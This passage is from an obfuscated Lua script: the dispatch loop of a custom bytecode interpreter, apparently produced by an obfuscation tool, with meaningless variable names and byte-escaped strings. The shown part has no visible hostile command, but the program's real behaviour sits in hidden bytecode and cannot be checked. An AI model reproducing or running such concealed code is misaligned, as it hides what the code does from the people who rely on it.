ba;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end end;elseif z<=44 then local q=y[134]local x={w[q](w[q+1])};local ba=0;for bb=q,y[76]do ba=ba+1;w[bb]=x[ba];end elseif z<46 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else w[y[134]]=y[652]*w[y[76]];end;elseif z<=69 then if 57>=z then if z<=51 then if 48>=z then if z~=48 then for q=y[134],y[652],1 do w[q]=nil;end;else local q=y[134]local x,ba=i(w[q](r(w,q+1,y[652])))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;end;elseif 49>=z then local q,x=0 while true do if q<=16 then if(q==7 or q<7)then if(q<=3)then if(q<=1)then if(q<1)then x=nil else w[y[134]]=w[y[652]][y[76]];end else if(3~=q)then n=n+1;else y=f[n];end end else if(q<=5)then if q~=5 then w[y[134]]=h[y[652]];else n=(n+1);end else if(7>q)then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if not(10~=q)then w[y[134]]={};else n=n+1;end end else if q<=13 then if(q==12)then y=f[n];else w[y[134]]=h[y[652]];end else if(q<=14)then n=(n+1);else if 16>q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end end else if(q<=24)then if q<=20 then if(q==18 or q<18)then if not(17~=q)then n=n+1;else y=f[n];end else if(q==19)then w[y[134]]=h[y[652]];else n=(n+1);end end else if(q<=22)then if(22>q)then y=f[n];else w[y[134]]={};end else if not(24==q)then n=n+1;else y=f[n];end end end else if(q<28 or q==28)then if q<=26 then if 26>q then w[y[134]]=h[y[652]];else n=n+1;end else if 27==q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if(q<30 or q==30)then if(29<q)then y=f[n];else n=(n+1);end else if(q<=31)then x=y[134]else if 32<q then break else w[x]=w[x]()end end end end end end q=(q+1)end elseif z>50 then w[y[134]]=w[y[652]]%y[76];else w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;end;elseif 54>=z then if 52>=z then local q=y[134]w[q](r(w,q+1,p))elseif z>53 then local q=d[y[652]];local x={};local ba={};for bb=1,y[76]do n=n+1;local bc=f[n];if bc[370]==55 then ba[bb-1]={w,bc[652]};else ba[bb-1]={h,bc[652]};end;v[#v+1]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[134]]=b(q,x,j);else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];q=y[134]w[q](w[q+1])end;elseif z<=55 then w[y[134]]=w[y[652]];elseif z>56 then h[y[652]]=w[y[134]];else if not w[y[134]]then n=n+1;else n=y[652];end;end;elseif 63>=z then if z<=60 then if z<=58 then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])elseif 60~=z then local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])else w[y[134]]=false;end;elseif 61>=z then local q=y[134];local x=w[y[652]];w[q+1]=x;w[q]=x[y[76]];elseif z~=63 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;else local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 66>=z then if 64>=z then local q=y[134];local x=w[y[652]];w[(q+1)]=x;w[q]=x[y[76]];elseif z>65 then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])else w[y[134]]=w[y[652]]-w[y[76]];end;elseif 67>=z then local q=w[y[76]];if q then n=n+1;else w[y[134]]=q;n=y[652];end;elseif 69~=z then local q;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else w[y[134]]=true;end;elseif 81>=z then if z<=75 then if 72>=z then if z<=70 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end elseif z>71 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else w[y[134]]=w[y[652]]%y[76];end;elseif z<=73 then h[y[652]]=w[y[134]];elseif 75>z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else do return end;end;elseif 78>=z then if z<=76 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end elseif 77<z then w[y[134]]=#w[y[652]];else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 79>=z then local q=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then w={};else if q>1 then n=n+1;else for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;end end else if q<=4 then if q<4 then y=f[n];else w[y[134]]=h[y[652]];end else if q>5 then y=f[n];else n=n+1;end end end else if q<=10 then if q<=8 then if 7<q then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if 10~=q then y=f[n];else w[y[134]]=h[y[652]];end end else if q<=12 then if q>11 then y=f[n];else n=n+1;end else if 13==q then w[y[134]]={};else n=n+1;end end end end else if q<=21 then if q<=17 then if q<=15 then y=f[n];else if 17>q then w[y[134]]={};else n=n+1;end end else if q<=19 then if 19>q then y=f[n];else w[y[134]][y[652]]=w[y[76]];end else if q==20 then n=n+1;else y=f[n];end end end else if q<=25 then if q<=23 then if 22==q then w[y[134]]=j[y[652]];else n=n+1;end else if q<25 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if q<=27 then if q~=27 then n=n+1;else y=f[n];end else if 29~=q then if w[y[134]]then n=n+1;else n=y[652];end;else break end end end end end q=q+1 end elseif z~=81 then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];q=y[134]w[q](w[q+1])end;elseif z<=87 then if z<=84 then if z<=82 then local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))elseif z<84 then local q=y[134];do return w[q],w[q+1]end else local q;local x;local ba;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end end;elseif 85>=z then local q=y[134]local x={w[q](r(w,q+1,y[652]))};local ba=0;for bb=q,y[76]do ba=ba+1;w[bb]=x[ba];end;elseif z~=87 then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];q=y[134]w[q](r(w,q+1,y[652]))else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;end;elseif z<=90 then if 88>=z then w[y[134]]=w[y[652]]/y[76];elseif z<90 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;else w[y[134]]=b(d[y[652]],nil,j);end;elseif z<=91 then w[y[134]]=false;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;elseif 93~=z then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];end;elseif z<=140 then if 116>=z then if z<=104 then if 98>=z then if 95>=z then if z>94 then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q]()end;elseif 96>=z then local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))elseif z==97 then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];for x=y[134],y[652],1 do w[x]=nil;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])else local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif z<=101 then if z<=99 then local q=y[134];local x=w[y[652]];w[q+1]=x;w[q]=x[w[y[76]]];elseif z==100 then if(y[134]<w[y[76]])then n=n+1;else n=y[652];end;else local q=y[134]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[76]do ba=ba+1;w[bb]=x[ba];end end;elseif 102>=z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+y[76];n=n+1;y=f[n];h[y[652]]=w[y[134]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;elseif 103<z then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];end;elseif z<=110 then if 107>=z then if z<=105 then local q;local x;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={r({},1,y[652])};n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];x=y[134];q=w[x];for ba=x+1,y[652]do t(q,w[ba])end;elseif 106<z then local q=y[134]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if bc>=q then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];q=y[134]w[q](w[q+1])end;elseif z<=108 then local q,x=0 while true do if(q<7 or q==7)then if(q<3 or q==3)then if(q<=1)then if 1>q then x=nil else w[y[134]][y[652]]=w[y[76]];end else if(2<q)then y=f[n];else n=n+1;end end else if(q<=5)then if(5>q)then w[y[134]]={};else n=(n+1);end else if not(7==q)then y=f[n];else w[y[134]][y[652]]=y[76];end end end else if(q<=11)then if(q<9 or q==9)then if 9>q then n=n+1;else y=f[n];end else if(10<q)then n=(n+1);else w[y[134]][y[652]]=w[y[76]];end end else if(q<13 or q==13)then if not(q~=12)then y=f[n];else x=y[134]end else if(15>q)then w[x]=w[x](r(w,x+1,y[652]))else break end end end end q=q+1 end elseif 109==z then local q;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q]()else local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end end;elseif z<=113 then if z<=111 then w[y[134]]=w[y[652]]-y[76];elseif 112<z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif z<=114 then local q=y[134]w[q]=w[q](r(w,q+1,p))elseif 116~=z then local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif z<=128 then if z<=122 then if 119>=z then if(z==117 or z<117)then local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[134]]=w[y[652]][y[76]];else if q~=2 then n=n+1;else y=f[n];end end else if q<=4 then if q~=4 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if q==5 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if q<=9 then if q<=7 then n=n+1;else if 9~=q then y=f[n];else w[y[134]][y[652]]=w[y[76]];end end else if q<=11 then if q<11 then n=n+1;else y=f[n];end else if q<13 then n=y[652];else break end end end end q=q+1 end elseif(119>z)then local q,x=0 while true do if q<=12 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 2>q then w={};else for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end end else if q<=3 then n=n+1;else if q~=5 then y=f[n];else w[y[134]]=h[y[652]];end end end else if q<=8 then if q<=6 then n=n+1;else if q>7 then w[y[134]]=j[y[652]];else y=f[n];end end else if q<=10 then if q<10 then n=n+1;else y=f[n];end else if 12>q then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if q<=18 then if q<=15 then if q<=13 then y=f[n];else if q<15 then w[y[134]]=y[652];else n=n+1;end end else if q<=16 then y=f[n];else if 18>q then w[y[134]]=y[652];else n=n+1;end end end else if q<=21 then if q<=19 then y=f[n];else if q==20 then w[y[134]]=y[652];else n=n+1;end end else if q<=23 then if 22==q then y=f[n];else x=y[134]end else if q==24 then w[x]=w[x](r(w,x+1,y[652]))else break end end end end end q=q+1 end else local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[134]]=h[y[652]];else if 2>q then n=n+1;else y=f[n];end end else if q<=4 then if q==3 then w[y[134]]=h[y[652]];else n=n+1;end else if 5==q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if q<=9 then if q<=7 then n=n+1;else if q~=9 then y=f[n];else w[y[134]]=w[y[652]][w[y[76]]];end end else if q<=11 then if q==10 then n=n+1;else y=f[n];end else if 13~=q then if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;else break end end end end q=q+1 end end;elseif 120>=z then w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;elseif 121==z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else local q;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 125>=z then if z<=123 then w[y[134]]={r({},1,y[652])};elseif 125>z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[652];x=y[76];q=k(w,g,ba,x);w[y[134]]=q;else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 126>=z then local q;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))elseif 128>z then local q=w[y[76]];if not q then n=n+1;else w[y[134]]=q;n=y[652];end;else local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end end;elseif 134>=z then if 131>=z then if(129>z or 129==z)then w[y[134]][y[652]]=w[y[76]];elseif(130<z)then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q>0 then w[y[134]]=w[y[652]][y[76]];else x=nil end else if 2<q then y=f[n];else n=n+1;end end else if q<=5 then if q~=5 then w[y[134]]=h[y[652]];else n=n+1;end else if q<=6 then y=f[n];else if q~=8 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if q<=13 then if q<=10 then if 9<q then w[y[134]]=y[652];else y=f[n];end else if q<=11 then n=n+1;else if q>12 then w[y[134]]=y[652];else y=f[n];end end end else if q<=15 then if q<15 then n=n+1;else y=f[n];end else if q<=16 then x=y[134]else if 18>q then w[x]=w[x](r(w,x+1,y[652]))else break end end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[134]]=w[y[652]];end else if 2==q then n=n+1;else y=f[n];end end else if q<=5 then if 5>q then w[y[134]]=y[652];else n=n+1;end else if 6<q then w[y[134]]=y[652];else y=f[n];end end end else if q<=11 then if q<=9 then if 9~=q then n=n+1;else y=f[n];end else if q==10 then w[y[134]]=y[652];else n=n+1;end end else if q<=13 then if 13~=q then y=f[n];else x=y[134]end else if q>14 then break else w[x]=w[x](r(w,x+1,y[652]))end end end end q=q+1 end end;elseif z<=132 then w[y[134]]=j[y[652]];elseif 134>z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else local q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 137>=z then if z<=135 then local q=y[134]w[q]=w[q](r(w,(q+1),y[652]))elseif 136<z then w[y[134]]=y[652];else 